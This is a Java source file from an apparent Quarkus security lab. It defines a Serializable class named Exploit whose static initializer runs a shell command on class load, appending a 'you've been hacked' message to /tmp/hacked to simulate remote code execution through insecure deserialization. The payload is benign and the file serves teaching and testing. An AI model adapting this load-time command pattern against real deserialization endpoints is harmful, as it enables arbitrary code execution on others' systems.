package it.dontesta.labs.quarkus.poc.security.iod.evil;

import java.io.Serial;
import java.io.Serializable;

/**
 * Classe dimostrativa utilizzata per testare le vulnerabilità di deserializzazione insicura.
 * Questa classe esegue codice arbitrario quando viene caricata dalla JVM, simulando
 * un potenziale payload malevolo che potrebbe essere sfruttato attraverso vulnerabilità
 * di deserializzazione.
 *
 * <p>AVVERTENZA: Questa classe è stata creata esclusivamente per scopi educativi
 * e di test sulla sicurezza delle applicazioni. Non utilizzare in ambienti di produzione
 * o per attività dannose.</p>
 */
public class Exploit implements Serializable {
  /**
   * Serial version UID utilizzato per la compatibilità di serializzazione.
   */
  @Serial
  private static final long serialVersionUID = -5022552899262915270L;

  /**
   * Blocco di inizializzazione statica che viene eseguito quando la classe viene caricata.
   * Esegue un comando shell che scrive un messaggio nel file /tmp/hacked simulando
   * un'esecuzione di codice remoto (RCE).
   */
  static {
    try {
      ProcessBuilder processBuilder =
          new ProcessBuilder("sh", "-c", "echo \"Sei stato hackerato ;-)\" >> /tmp/hacked");
      processBuilder.start();
    } catch (Exception e) {
      e.printStackTrace();
    }
  }
}